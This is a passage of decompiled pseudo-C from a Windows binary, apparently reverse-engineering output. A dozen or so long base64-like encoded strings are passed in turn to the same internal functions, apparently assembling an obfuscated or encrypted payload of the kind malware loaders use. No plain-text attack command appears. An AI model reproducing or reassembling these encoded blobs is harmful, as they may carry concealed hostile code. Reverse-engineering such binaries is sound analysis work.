\"VSPd/FpXp7WfI8dPDUhOH3cKW4Vda534GuMf8VT1/nch8KZvVww1Km/fNbx2H8fxAhcRa2F8HgeL9vVLgm/d9FYHb5vdJSMnDYjGT0q/iWmm22WUihunDKZle1ctiG53d5W2AuonvcRLU+cjJTPSP/Gcpk9bNQQOET8V9HbnTxuUSCl3MCzmUxuAeMwFI900Wlen61CMa08NkE4fd2uJqHBrnSAa4x/fhOxidyE4pm9XT+jT1N81dHYfx0LlRdVrYYQeB4v3IMvTb90MVgdvy415QCcNQMZPSiyqVdzbZVyKG6fMNLGtVy1Qbnd3Ke1nhCe9HEtT5+/5adw/8VSmT1vCDdu1PxU8dudPJ+yeAncwFOZTGxLCEdwj3QxaV6fTJIENTw3YTh93eLHdQWudaBrjH/56R0J3IWCmb1cuxkCP3zUsdh/HClkn7mthzB4HixE/sdtv3URWB2/zONZdJw04xk9Kvgzc0dtlJIobp98ppbBXLRhud3frbPucJ71US1Pn6CSI+D/xDKZPW8ULdb8/FWR2508eavcRdzBc5lMb4kNPFCPdRFpXp5CRSb1PDeBOH3eVYTXha51QGuMfNDQP7HchqKdvV8ssaMzfNeR3H8eaFyBYa2EUHweLXo+kvG/dnFcHb2mBMg8nDfDHT0rBNZeH22XsixunVSIJfVct4G93dwenmVgnvaxKU+d+eZ5EP/HEp09b7PhUQz8VrHfnTztJnWB3MITnUxuHL0JCI92cW1enkecI6k8NKE8fd7x8oBVrnZgb4x9H/KT7dyGQp29X1lfs\"\n    ;\n    puStack852 = &stack0xfffffcc8;\n    puStack856 = &stack0xfffffce4;\n    pcStack860 = 0x406cbd;\n    puStack856 = fcn.00401091();\n    pcStack848 = 0xffffffff;\n    puStack852 = NULL;\n    pcStack860 = 0x406ccd;\n    fcn.004011db();\n    if (0xf < puStack784) {\n        pcStack860 = puStack804;\n        puStack864 = 0x406cdd;\n        fcn.0040b0dd();\n    }\n    pcStack860 = \n    \"C9813Hcfx1BkY3VrYVwfB4tWs+/Eb93UVwdvrbdywicNqMdPSiMzJFXbZbSLG6cDA/O9Vy2ob3d3PeVLcie95EpT50oKkSE/8bynT1sLOWCoPxXUd+dPO6BKhHcwzOdTG9+mfk4j3dRbV6cFQXyvTw1wTx93mYriDWudwBvjH1SyjiV3Idinb1fNRCjQ3zWUdx/HJywf3mthZB8Hi8aG3SVv3exXB2+CoZnQJ81gg+BXMd/pYO2UkBIjHTgqq2mqb70cl9ZI9SfNcD77Cj3f6XCTRZcMIx0oLV2oZW+9DBH1oVknzUCbV3zF3+lAu0hi3iMdGMJv6wZvvTyfC0KNJ81QIvqfmt/pULvSslQjHQg5F5Zcb70sJ7ruMifNIN95z5mid56x9j8xIIXp6InhwEG4kE/N0LBonuT/9XmfF3cP26UoIoHcE2PtjNsoytpPzcD2wXLZ//VpnlJ2QNulGHY0ldFj7bwtI0Z5T83wOkagzv/1WV4VXqXbpQgJCh+EY+2sUv2B90/N4P/TfA//9UmORA1A9H+BixvTQPJXTRxVuJADRrvM8cng0PHPU+cn6WDxuXRpzfBZV6f4aPPRiOCk9xHFiIiwtazwu5bjH3uw6AY7QfWbxSMUEWRgGrDg3ie9qEhT593fXyw/8filT1s1hgetPxWodedPR5foK3cwiOVTG/Eyi+Yj3ZhZV6cVyoNtTw00TR93mxbYI2udnBnjHxLYp+x3IZylb1e4qIYS3zXYdR/HAZflQmthIB0Hi5JTPaFv3dBVB29p9enGJw2kxU9KwNoc\"\n    ;\n    puStack864 = &stack0xfffffcbc;\n    puStack868 = &stack0xfffffcd8;\n    pcStack872 = 0x406cf4;\n    puStack868 = fcn.00401091();\n    pcStack860 = 0xffffffff;\n    puStack864 = NULL;\n    pcStack872 = 0x406d04;\n    fcn.004011db();\n    if (0xf < puStack796) {\n        pcStack872 = puStack816;\n        puStack876 = 0x406d14;\n        fcn.0040b0dd();\n    }\n    pcStack872 = \n    \"ZNtlsIkbp2bxIIBXLbRtd3e85g7mJ73gSFPnybocDj/xsKVPWxzllXY/FdB150/ewzkkdzDw5VMbiVfS/SPd0FlXp+VqpDpPDXxNH3cc9TXXa53EGeMfGnsPa3chxKVvV9apZ2LfNZB1H8fPkmCWa2FoHQeLnqknWG/d6FUHb5H1M4wnDZzFT0r82op+22V4iRunmyvOTFctfG13dzqRiUgnvThIU+dYVp1hP/FopU9b20i1FT8VGHXnT/daXIx3MDjlUxtas51xI90oWVenTH9PlU8NhE0fdz8uTqVrnQwZ4x8Mp6DWdyEMpW9XW+IJpt81SHUfx1YvgvBrYbAdB4vwOH7Eb90gVQdvxUbenScNVMVPSqSYSArbZUCJG6fOYo7kVy1EbXd3nX14eye9cEhT55YLPKc/8SClT1tb3psYPxVAdedPhA2WLHcwYOVTG7fcwG0j3WBZV6faRtVmTw3MTR93gnhlNWuddBnjH/C554h3IXSlb1fVUKXs3zUAdR/H9xlHhGth+B0Hi5m+WvZv3XhVB2+AFAcPJw0MxU9K6WS8U9tlCIkbp+fFT2NXLQxtd3fQWN5vJ71ISFPnXTBAqT/xGKVPWyVaAL4/FYh250/EktukdzCo5lMb6iJSMiPduFpXp7Ojl9BPDRROH3fcTAY9a528GuMfccbsAXchvKZvV4y11oDfNfh2H8cb5Z2La2EAHgeLYHlmPm/dsFYHb8tKIXYnDcTGT0oE67fQ22XQihunz7Ql8Vct1G53d6ntFAsnvYBLU+cGFqfRP/HQpk9b96Qk\"\n    ;\n    puStack876 = &stack0xfffffcb0;\n    puStack880 = &stack0xfffffccc;\n    pcStack884 = 0x406d2b;\n    puStack880 = fcn.00401091();\n    pcStack872 = 0xffffffff;\n    puStack876 = NULL;\n    pcStack884 = 0x406d3b;\n    fcn.004011db();\n    if (0xf < puStack808) {\n        pcStack884 = puStack828;\n        puStack888 = 0x406d4b;\n        fcn.0040b0dd();\n    }\n    pcStack884 = \n    \"Dj8VsHbnTy4yPAN3MJDmUxtoK/E+I93wWlenAIMwYU8NXE4fd3QIfxdrneQa4x8nJ997dyHkpm9XP34svt81sHYfx+mmEcFrYUgeB4vg5LFKb93IVgdvNMEvXScNvMZPSrdMs57bZZiKG6fha3IKVy2cbnd333DiFSe92EtT526pQT0/8YimT1vqCQI+PxX4dudPSn3ZO3cw2OZTG9T58QAj3chaV6dcwHriTw1kTh93B/vNPGudLBrjH6gOpaR3ISymb1dYIzd+3zVodh/HZ6gKTWthkB4Hi8VVqGRv3QBWB2/tMDTKJw10xk9KiB88GNtlYIobp+fXzJNXLWRud3dIXaBDJ70QS1PnB1wWqj/xQKZPWzyqQiA/FSB2508lAEkrdzAA5lMbkFiVASPdAFpXp8n+ayFPDaxOH3dbovJca50UGuMf0YEErHchFKZvVw25XKDfNSB2H8fLpreoa2HYHgeLG944qW/dWFYHbx5/GWwnDSzGT0pzhfgj22UoihunuGPZ4FctLG53d2Io0/onvWhLU+dhJJGzP/E4pk9bRxDeaz8VaHbnT1CC0FF3MEjmUxvCi7gfI91YWlenwOBPWU8N9E4fd5Z3uPxrnVwa4x9NlbmSdyFcpm9XwUSorN81GHYfxwGFsRtrYeAeB4v+oLVKb92QVwdvlr4tuScN5MdPSn0ry3jbZfCLG6eBaHy2Vy30b3d3CV/VNSe9oEpT50UAcQ0/8fCnT1usjYwjPxWQd+dP4ym/hXcwsOdTG9CGsS4j3ZBbV6fwVTthTw08Tx93p40T\"\n    ;\n    puStack888 = &stack0xfffffca4;\n    puStack892 = &stack0xfffffcc0;\n    pcStack896 = 0x406d62;\n    puStack892 = fcn.00401091();\n    pcStack884 = 0xffffffff;\n    puStack888 = NULL;\n    pcStack896 = 0x406d72;\n    fcn.004011db();\n    if (0xf < puStack820) {\n        pcStack896 = puStack840;\n        puStack900 = 0x406d82;\n        fcn.0040b0dd();\n    }\n    pcStack896 = \n    \"SWudhBvjH57U1/h3IYSnb1eAvyTL3zXQdx/HbHq+XWthKB8Hi9NIZwhv3ahXB29dynrFJw3cx09K4RWXpNtluIsbpx986JhXLbxvd3cgMfLKJ734SlPnz0rUwz/xqKdPW18Xi4E/Fdh350+LtF4kdzD451Mb+oxCbCPd6FtXp1B34X9PDURPH3e8xjM6a53MG+MfjcFF5XchzKdvV7uLlE7fNYh3H8fbJjJLa2FwHweLdB49LW/d4FcHb8VF4pInDZTHT0r9JSki22WAixuniq+pvVcthG93d9AQMvEnfTDxUF1KI1lk5+27jHfhICxdt5dXzQQJxXCuJ30gJD5wiiNZdK7bx7F34TBWngo1KlPytaYnzXxpOhRpocwMXOA/MUSVHb0Un9UMovgCRd/1SEE/dWVy6bSFBKZsPzFULw5GhJ/VHG5ZHTff9VjN2y7scumkzeZ+7j8xJLL4n8Sf1WwcifE13/Uoyja7yXLp1H0iQ7M/MTTblI3cn9V8KsFeGt/1OBaFR35y6cS2H9XxPzEE6+G41J/VTG6OmqTf9QhEhMiPcun0RpvO2T8xFLoucFKf1Vz20WRx3/UY8VGyy3Lp5JpyUZgQEZanTy9YDm+9dG3IiJN+QwjxebBdq2tTG5fteGWlWD0xsKVvV5AQhskY2HY6UWDYD6wYrAzBigeLZ5y8+iO9zWutG2QJ9LjiiOC1NU1R51OMGOH4dLSnpZRUGJAtOOS3u8o9ZXAdx0/TlY1UGeMfjGKC24j43FITaPr2sZhtQguO0/HWPOQa/rZOspBYHRiw\"\n    ;\n    puStack900 = &stack0xfffffc98;\n    puStack904 = &stack0xfffffcb4;\n    pcStack908 = 0x406d99;\n    puStack904 = fcn.00401091();\n    pcStack896 = 0xffffffff;\n    puStack900 = NULL;\n    pcStack908 = 0x406da9;\n    fcn.004011db();\n    if (0xf < puStack832) {\n        pcStack908 = puStack852;\n        puStack912 = 0x406db9;\n        fcn.0040b0dd();\n    }\n    pcStack908 = \n    \"9vrVFVAFb3fY56XIdaA4O1Dx2/lv8GEU9ORYsB5zIj2+QbBhyBjmCCWRx09KmTRVpBxrCPmh2ObO6AhvvbxuyIibdPADLtD1x1PnIaGcsJJ0jlhPscih0KjLWSuA5vDgDSBmvyBtk21v+b07IW+0MUgoWJCoQkvyJQ4J0GugOOZd+GlTG+PV1I2kWDtUJR0Q/pLQ2HcN9B7I4Lt0pSfWRAhtHwf5odjgzqgykFft8HHIGIMpKxzM8LUp2PLriSFztW+97Wf903wpFBCIiBgKO/JNLgmlRFissvQbiIsbp4WIURiQIwgdzQhO2qDYHy30S+wYLyAMazacdylPWyUdEPjLUNjYSE/13Bt4sIZlu4gdXOB9tLpXJWUjmRtNpVPeu+5YDHYfxzV12Gn7suPV8IqkWE+xNKLQqEcQiIgYNSD85AN3wPnwjRvjH320kGxY1Venby045KPeck8fvRzM8LVTLYgdXOAHYWSh8KQtmOSsw1f9hueFxHGgOE+g0OTs5JcQB0HspvCkV02AVLiQd70QTqCIHy2AT+wY82/avjshb7QzSOQOb72obMiIK2JZ6Ao4sEJdlR6kzez4nNtGsKQrPSSoqBnNMOel5HWgODnwEPDkneMfcTEksBzXV6cZ7Tx4m5YYsG3FLLH1fUR/1BvjbbWgDDmQpKjVxRx13XhgArLgiGX4vzElGKzkkaUAJGkdQPRAKSZXB8nRDdjEtwOljINnxhv1E+1lKgHhsKG5qFgd/SQdxXDwM+KI4L1wwYeb0Tgcld2cMHiwpCMNdC0q5IADVVAI\"\n    ;\n    puStack912 = &stack0xfffffc8c;\n    puStack916 = &stack0xfffffca8;\n    pcStack920 = 0x406dd0;\n    puStack916 = fcn.00401091();\n    pcStack908 = 0xffffffff;\n    puStack912 = NULL;\n    pcStack920 = 0x406de0;\n    fcn.004011db();\n    if (0xf < puStack844) {\n        pcStack920 = puStack864;\n        puStack924 = 0x406df0;\n        fcn.0040b0dd();\n    }\n    pcStack920 = \n    \"K/w4sD759Ck2aOpzOQywioSoWKNec91wYFzaH3cLL0+g/OTs5C8yQczvWLBTWdWkuRAAP3fnO614CBvaSlOT4TD0+5KLG9P9aEBL+lcHG07Wk1W9S7GZmEzsGC8MHJSNPJB0+NCwEJ8tW5CIiOeFxHGgOE+gPOLs5PVy+HTkn7WMURiQqviQiGCjTh93uftY+HbnUwyEBAeLDJNdW1ewNkYHb2D/7U8f2bHQ9QBT5/W9mSCMJbWwXbioWBtgELOXiBgzJIxl+MSIax2EHVzg+nTkWFu5QCcnVwd47k7nTwje+ziwMGxtsiMZyAE05FmwpKinhfgE0IgxuL/giNPqR0QhHL293yf9XB0YsKeoWJCbOMlL3ZNcY2wYaeZKuUhQpBzTKs1EV7CkX6kbWhC3dHfnWHB1H8c1ddgoIWK87/h0tKeFgFEYkFftDHLIGA7iieA4W6dE41Ib47AHQcCh8KRXTQxSuJCzTmxavgMFZXPm+k8nFfQYl4sb1f6EI4B4qYhvdwVWqGtwCM/fSlOV4uAfGBCZi6dPL+ZIk1AQROd35zuuhOPAWH/D51NvEuMAnCU3T1uroHh+l293i+DbI4/j/+/r99v5b/CxqyKz00ovWdNfQG9vd3eTeGnO5NCO3VPnnz+V5n20kCjn9xpZGe0EHcV08CyPdx+197EeGvyOHm21iAzU31tX1dekSpPY25X9HGCdV09KIV+8Vhiwq/mppFjKx6dvJb+EOo1I2uUFrcRY68PnU2lb+EpytDKyKeWkeOaXb3cFX5BSj7BSsjjh5ETacx8H\"\n    ;\n    puStack924 = &stack0xfffffc80;\n    puStack928 = &stack0xfffffc9c;\n    pcStack932 = 0x406e07;\n    puStack928 = fcn.00401091();\n    pcStack920 = 0xffffffff;\n    puStack924 = NULL;\n    pcStack932 = 0x406e17;\n    fcn.004011db();\n    if (0xf < puStack856) {\n        pcStack932 = puStack876;\n        puStack936 = 0x406e27;\n        fcn.0040b0dd();\n    }\n    pcStack932 = \n    \"9yBgg2SRRs/29wVI05NVvUu1s1w2QAj6s5cac4WOTOovZ7Ajzwdvd/4cO/YFrchYBMHnU2fY5HUxHAg98VTV3VgQPuV35zMkjGX4xI4vZVTkae97CRhZxYsjj3hvlW93YzoznXDiTZA20eSukRltr3APUTPZVFvlp3XHhAVVQAhjjcdPMGxtA9fcv7gqb73tZ/3TfCsUgN7fk0preYoo6j5j8J+D4x8HAuDTpinlqHiZlW93C9y0bc0YaD3gUJXhFPTOlYsb23SgLZjklnvtcIhtrWP1HDnFuSfPIansCLwZG6dbhislbKqNsAXfHFsLC53AssC5m9EYH5X3+bNQPelYsPjFB28NSG0c00i/eO4+SUVvsZcMe5joDjtWJQ1oQLL9d3edcJSEa+49+FTw8hvjHxN215juL00FU/1zfAlksLHgiCe96EtT59IROwo/8bimT1vU2bCvPxXodudP8zq+8XcwyOZTG178pYYj3dhaV6fBe2n3Tw10Th93qdp1Mmud3BrjH1Lpwoh3Idymb1d4Wr6w3zWYdh/HIMzNpWthYB4Hi+CTUt1v3RBWB29+DjscJw1kxk9KeqE7GttlcIobp/x41/1XLXRud3d31KQFJ70gS1PnN38tzT/xcKZPW2Fa/xo/FRB2508nkP8odzAw5lMbKYz6XCPdEFpXpw61T+FPDbxOH3cFaSG2a50EGuMf2G8XIXchBKZvVx+7TAffNVB2H8dBD9ICa2GoHgeLWWfS+G/dKFYHb8k3xSsnDVzGT0oiT73V22U4ihunsMAKaFctPG53\"\n    ;\n    puStack936 = &stack0xfffffc74;\n    puStack940 = &stack0xfffffc90;\n    pcStack944 = 0x406e3e;\n    puStack940 = fcn.00401091();\n    pcStack932 = 0xffffffff;\n    puStack936 = NULL;\n    pcStack944 = 0x406e4e;\n    fcn.004011db();\n    if (0xf < puStack868) {\n        pcStack944 = puStack888;\n        puStack948 = 0x406e5e;\n        fcn.0040b0dd();\n    }\n    pcStack944 = \n    \"d0tq+acnvXhLU+ezVk1eP/Eopk9bUKbUnz8VWHbnT0h9DPR3MHjmUxvtalS1I91oWlenFGNdSU8NxE4fd7/NThFrnUwa4x+nVXoCdyFMpm9X3tD9W981CHYfx1RZmcxrYfAeB4sbiR99b91gVgdvIWeSeCcNFMZPSpadzr/bZQCKG6cBQXD1Vy0Ebnd3WsHG4Se9sEpT5xZzA0c/8eCnT1ucBK/hPxWAd+dPD+0VFncwoOdTGwo4K6kj3aBbV6fyk5qMTw0MTx93R0FlaWudtBvjH6twKvl3IbSnb1ednU8F3zXAdx/HSVZAWGthOB8Hi+CpzgFv3bhXB2+/cSFXJw3Mx09K/NSBwdtlyIsbp1dsYVVXLcxvd3cWCN54J72ISlPnJljWDD/x2KdPW20xA54/Fch350/hkTkZdzDo51Mb9H+vbCPd+FtXp8dChadPDVRPH3eruU8ua538G+Mf7THW6nch/KdvV4jVtuLfNbh3H8eCQHGCa2FAHweLbxuoSG/d8FcHbzyEAbwnDYTHT0qerAxL22WQixunhRaDI1ctlG93dyWHseMnvcBKU+e8mHi5P/GQp09bH+98fT8V8HfnT7faw4l3MNDnUxtYSq9jIx0wSN7rWG+9FHGxKcMnzWjBy/Ji3+loR4VWdyMdIPORNAVvvQQeNrh5J814X7Caa3C8GlzgkI1s9LzOwuGEiNZCT82ERCkn6//1FWRhS6LbpVxrqHcaY+3wrSheeE/NtArsbuX/9QWCa25A26VMeiZoBGPt4Cg/9YJPzaTgsbqn//V1zHez\"\n    ;\n    puStack948 = &stack0xfffffc68;\n    puStack952 = &stack0xfffffc84;\n    pcStack956 = 0x406e75;\n    puStack952 = fcn.00401091();\n    pcStack944 = 0xffffffff;\n    puStack948 = NULL;\n    pcStack956 = 0x406e85;\n    fcn.004011db();\n    if (0xf < puStack880) {\n        pcStack956 = puStack900;\n        puStack960 = 0x406e95;\n        fcn.0040b0dd();\n    }\n    pcStack956 = \n    \"8dulPLdV929j7ZBBRSH5T83UOvybG//1ZSg4kGjbpSwrWT6jY+2As00l5E/NxFUMLmP/9VXVPEob26UcgRQjSmPtsPqvVw9PzfS9I1G8//VFekLCg9ulDH8C0tBj7aAlqr5WT83k8u2XmtA11VPnIXFEHgeLb5BYDsinbys8nANtRXO1Awy5XG2oGKwjmcgDixuFkYvMnxWEA293x0zaRU9lCEtKUw/yNkUnfUAfp08jwFvCb32oc3fnqL/x3/81iVfnU4a94LyzYRhLW1cr+uw3Vw3M408fFPNjP3IpUFcb42zYOIqfNehTp2+vjPdZT53gG3cf4U22Ad8psOcfB4Gg+N9jLQBrVwcUjsNBd2XUG8dPloLtvyOZgAOLG6qnPAifFcwDb3fsSApxT2VQS0pT6/WWaSd9GB+nT+MWaWNvfeBzd+cvIZf//zXBV+dTR7XqlbNhIEtbV42omhZXDfTjTx/2FOrdcimYVxvj5/LxR581IFOnb7Vg5olPnTgbdx9ndKz+3ylo5x8HJ0Or7WMtyGtXB5rvS4F3ZRwbx08bZImuI5l4A4sb4lcOWZ8VNANvd3Q9qyNPZZhLSlMSGkRWJ33QH6dPaqsv2299OHN358XLyN3/NRlX51O5/ua1s2HoS1tXqLz1+lcNPONPHxCvYWxyKaBXG+N5qqdjnzUYU6dvDIK740+dcBt3H9eDWQXfKSDnHwcGumQqYy2Qa1cHNRP4G3dlRBvHT0lZkekjmTADixvQiqYHnxV8A293v3oN1E9l4EtKUzAB9YEnfagfp0+9UF6x\"\n    ;\n    puStack960 = &stack0xfffffc5c;\n    puStack964 = &stack0xfffffc78;\n    pcStack968 = 0x406eac;\n    puStack964 = fcn.00401091();\n    pcStack956 = 0xffffffff;\n    puStack960 = NULL;\n    pcStack968 = 0x406ebc;\n    fcn.004011db();\n    if (0xf < puStack892) {\n        pcStack968 = puStack912;\n        puStack972 = 0x406ecc;\n        fcn.0040b0dd();\n    }\n    pcStack968 = \n    \"b31wc3fnKTDTS/81UVfnUwmFYZezYbBLW1eLumMWVw1k408fFyYjZnIp6Fcb42lajG2fNVBTp29SuP5uT51IG3cfpllpf98pGOcfB1UCgxtjLVhsVweXiXShd2WMHMdPviusXCOZ6ASLGwFsM66fFaQEb3c221q0T2UoTEpTKnh3ISd9YBinTwyNISVvfYh0d+clOCvF/zWpUOdTs2y9bbNheExbVykrXZ9XDazkTx/ugdoOcikwUBvjsBem1J81iFSnb8LF5PBPnYAcdx8SU4sH3ynQ4B8Hg9A5lWMtYGxXB60NTet3ZbQcx08H94HaI5mgBIsbvFso6J8V7ARvdzRU2iBPZXBMSlMlmsY1J304GKdP3/QcIm99wHR355mGERP/NeFQ51O/Z2wCs2EATFtXbhmtnVcN1ORPH04tC31yKXhQG+N9IL/vnzXAVKdvejcVkU+d2Bx3HyrKvRHfKYjgHwdGEbyDYy0obFcHbswN+ndl/BzHT7Whc64jmZgEixvSl8zPnxXUBG93q2KzOU9luExKU/uo0+MnffAYp09cRhWxb30YdHfn+JzRl/81OVDnU6U6NHuzYchMW1e4X2gBVw0c5E8fw16ggXIpgFAb4/3s2TifNThUp2/w1q0WT50QHHcfpOSS798pQOAfB6wqJBtjLfBsVwcobBh5d2UkHMdPlSmtwiOZUASLG3rlIZefFRwEb3fQBTwZT2WATEpTaynfDCd9yBinT9vYGcxvfVB0d+e+1KMb/zVxUOdTx9mGELNhkExbVxf2aO1XDUTkTx9GsvOP\"\n    ;\n    puStack972 = &stack0xfffffc50;\n    puStack976 = &stack0xfffffc6c;\n    pcStack980 = 0x406ee3;\n    puStack976 = fcn.00401091();\n    pcStack968 = 0xffffffff;\n    puStack972 = NULL;\n    pcStack980 = 0x406ef3;\n    fcn.004011db();\n    if (0xf < puStack904) {\n        pcStack980 = puStack924;\n        puStack984 = 0x406f03;\n        fcn.0040b0dd();\n    }\n    pcStack980 = \n    \"cinIUBvjgBvoIJ81cFSnb5jpXdxPnWgcdx+zcSMu3yk44B8HtmHAV2MtuGxXB2DxHoN3ZWwcx0/vXhMfI5kIBIsb8aNhm58VRARvd5Nl/ghPZchMSlNmjyFxJ32AGKdPOYPNtW99aHR353Gtd3n/NUlQ51Oagk5+s2FYTVtXCddgTFcNjOVPHy4vxplyKRBRG+O5AohrnzWoVadvSeF5Pk+doB13H9Mpdw3fKfDhHwctU2AsYy1AbVcHzu5tR3dllB3HTwviCIIjmcAFixsfp2K6nxWMBW93AMemQU9lEE1KU356XDwnfVgZp09EPK+Fb32gdXfnik0hgP81gVHnU/b8eJmzYWBNW1fC2wS5Vw205U8fe6BKr3IpWFEb431QdmmfNeBVp28Djhh0T534HXcfRZwxa98pqOEfBx0dIdRjLQhtVwcDoFrhd2XcHcdP+kJ5CiOZuAWLG2ETY82fFfQFb3efrmrvT2VYTUpTyJdUVSd9EBmnT+ThoK1vffh1d+fvqHhN/zXZUedTnZhaAbNhKE1bV3eQso9XDfzlTx+TitSKcilgURvjYGfclZ812FWnb/eaPphPnTAddx9dyDU13ylg4R8HrCE7NWMt0G1XB4YpazV3ZQQdx08TCeYKI5lwBYsbNuUEnp8VPAVvd3AIr2FPZaBNSlN/v6kFJ33oGadP7/k6vW99MHV352YcsTT/NRFR51N/aSces2HwTVtXrxo/U1cNJOVPH+X4XAFyKahRG+NuQ5ZsnzUQVadvp3b0jk+dCB13H+6FsXHfKVjhHwdtw/Qp\"\n    ;\n    puStack984 = &stack0xfffffc44;\n    puStack988 = &stack0xfffffc60;\n    pcStack992 = 0x406f1a;\n    puStack988 = fcn.00401091();\n    pcStack980 = 0xffffffff;\n    puStack984 = NULL;\n    pcStack992 = 0x406f2a;\n    fcn.004011db();\n    if (0xf < puStack916) {\n        pcStack992 = puStack936;\n        puStack996 = 0x406f3a;\n        fcn.0040b0dd();\n    }\n    pcStack992 = \n    \"Yy2YbVcHBsNqYHdlTB3HT/LHs5QjmSgFixvEx652nxVkBW93PErQTU9l6E1KU7E5VFwnfaAZp0/14sEfb31IdXfn54Okt/81aVHnU6Q8yzuzYbhNW1fXkq3FVw1s5U8fe22SrnIp8FEb4xa7mdafNUhVp2/IkyfCT51AHXcfuuNWpd8pEOEfB768O45jLaBtVwcfsJWXd2V0HcdPRMKwOiOZ4AaLG/gE0AKfFawGb3f7upxaT2UwTkpT0PToRyd9eBqnT8uKhVxvfYB2d+cdytmO/zWhUudThyAmyLNhQE5bV70aDSZXDZTmTx8KdGq+cik4UhvjBujpfp81gFanb1bc43lPnZgedx//ENWr3ynI4h8HCgnDpWMtaG5XB/I9v0p3Zbwex0/q63BJI5nYBosbopMEZJ8VlAZvdwrgx5pPZXhOSlP77SSQJ30wGqdPNvCNc2992HZ35zw2ayj/NflS51N50PJos2EITltXniJnEFcN3OZPH2MRHlByKUBSG+PFGdvunzX4Vqdvs3Q0WU+d0B53HwmK3MrfKYDiHwfDpiyTYy0wblcH+zLGIXdl5B7HTxK0DuYjmZAGixsdLyKgnxXcBm93U47QHk9lQE5KU86VrUwnfQgap09tWYncb30Qdnfnd6ZLuP81MVLnU88KzdmzYdBOW1fRiBseVw0E5k8fOwba9nIpiFIb41zoyhCfNTBWp2/eZXzZT50oHncfGaa0498peOIfB3T7iLJjLfhuVwdwml2qd2UsHsdPMrlJLSOZSAaLGyrqEqWfFQQGb3eXBOQT\"\n    ;\n    puStack996 = &stack0xfffffc38;\n    puStack1000 = &stack0xfffffc54;\n    pcStack1004 = 0x406f51;\n    puStack1000 = fcn.00401091();\n    pcStack992 = 0xffffffff;\n    puStack996 = NULL;\n    pcStack1004 = 0x406f61;\n    fcn.004011db();\n    if (0xf < puStack928) {\n        pcStack1004 = puStack948;\n        puStack1008 = 0x406f71;\n        fcn.0040b0dd();\n    }\n    pcStack1004 = \n    \"T2WITkpT+Hr1dyd9wBqnT+r4Yw1vfSh2d+dOwjoA/zUJUudTXqR/OrNhmE5bV0sg7BNXDUzmTx/64yOJcinQUhvjx8BZ/p81aFanb6vQug9PnWAedx/pQh5I3ykw4h8Hnr1cm2MtgG5XBwKNVBF3ZVQex0+L79gTI5kABosboI5zgJ8VTAZvdyL9e25PZdBOSlOOVEADJ32YGqdP0ilVNW99YHZ35+4Zsp1QgEzsGMS0t3XTHNJZsKQRKnbWd1cNfOZPH1WE6zZyKeBSG+OsBqyhnzVYVqdvqZotvE+dsB93H8SOavTfKeDjHwfUlI+7Yy1Qb1cHAfPh6XdlhB/HTytmtwUjmfAHixtlmB9unxW8B293vm/K9k9lIE9KU8609VMnfWgbp08QR7Rib32wd3fnO+dgDv81kVPnU0GYUQizYXBPW1dJ90SJVw2k508fnWpH3XIpKFMb4+8lCuefNZBXp2+uq2ejT52IH3cfeC24jN8p2OMfBxmC89FjLRhvVwcHs04Wd2XMH8dPaIaqqiOZqAeLG+FUyRefFeQHb3dLKw3HT2VoT0pTbpljdid9IBunTz8M/0dvfch3d+fr/ioH/zXpU+dT0jzrfbNhOE9bV0Nn0iJXDeznTx9mgWy6cilwUxvjV15g0J81yFenb+hvaklPncAfdx9BmVEa3ymQ4x8HlCGbHWMtIG9XB9CCDYd3ZfQfx0/xPvAsI1lgxu22s3fhLAqHFgxXzQATuOJbJ308TXzukiNZcOR6ENZ34TxrC3EgV80QYc7j2id9LIuXJ6AjWUDT\"\n    ;\n    puStack1008 = &stack0xfffffc2c;\n    puStack1012 = &stack0xfffffc48;\n    pcStack1016 = 0x406f88;\n    puStack1012 = fcn.00401091();\n    pcStack1004 = 0xffffffff;\n    puStack1008 = NULL;\n    pcStack1016 = 0x406f98;\n    fcn.004011db();\n    if (0xf < puStack940) {\n        pcStack1016 = puStack960;\n        puStack1020 = 0x406fa8;\n        fcn.0040b0dd();\n    }\n    pcStack1016 = \n    \"R2NVd+EMbOOagVfNIJ2BgnsnfRy5ORH8I1lQclIRpnfhHA9MfMFXzTARDeg5J30MPZME7CNZIGbQysx34WyiTt3xV81AxwriUid9fKOblVIjWTDFE1syd+F8wAnr1FfNUFVXn4InfWzXSuTEI1kAOeBvq3fhTItFcUZXzWACvaSaJ31cPtt1jSNZEEWQ+et34VzUv5ssV81w9m+6VSd9TP0ubeYMj7QHi2nNmF9XpxtgECjcd+czJIRr3e12+ZNAZfDA/HTkC+bzQF5gVwd4cHvnT1uM4TiwOCn4Vxvjs6ge5KelXFIYkCV1cHN351gg2h/HCm7WtbpdzAm4dG+oWBnzp28jAB0NYOVPH963a+BKuVxSpBxjPGRvl1j89KdvV+2EcsgYOxjfHy1sTOwYJxSRZRCJG6fgW72Eaej4u3gFLMcLqm29WEhT5/yz4/WIj6RYNWTdVXhQFG934hhP9YgbeLA2axqXGmo6dTEUCOEpPbBtVwcdBWjjTx9gUGVPSvVBxuTj9fiPpFjv+vPTdfU6gIjeTw/kieA4DmW0Waxvy2s2nC0NT1v/DvqoB4Vwcliwv9YjUI+1oxjG5HbgB2EMt/CkLZjkuahXjTDn8OCJ4DiwSrnYX6QcI63/CNtcqPsOxyMCG3nfkc0cd/XkSfWsk2RFoB+4dI5aOelcA6N6D2HipO9gac0Ytbzi9iNjkhaGwWWQUjNNqrNizsGB/YubceKHVynWMH5sjY4wyzYrgmNn0Lk+Gb57VoqHr7TRAzBeNXXZ8ieZ4Gu9jG8VRO/d9KNop/YB\"\n    ;\n    puStack1020 = &stack0xfffffc20;\n    puStack1024 = &stack0xfffffc3c;\n    pcStack1028 = 0x406fbf;\n    puStack1024 = fcn.00401091();\n    pcStack1016 = 0xffffffff;\n    puStack1020 = NULL;\n    pcStack1028 = 0x406fcf;\n    fcn.004011db();\n    if (0xf < puStack952) {\n        pcStack1028 = puStack972;\n        puStack1032 = 0x406fdf;\n        fcn.0040b0dd();\n    }\n    pcStack1028 = \n    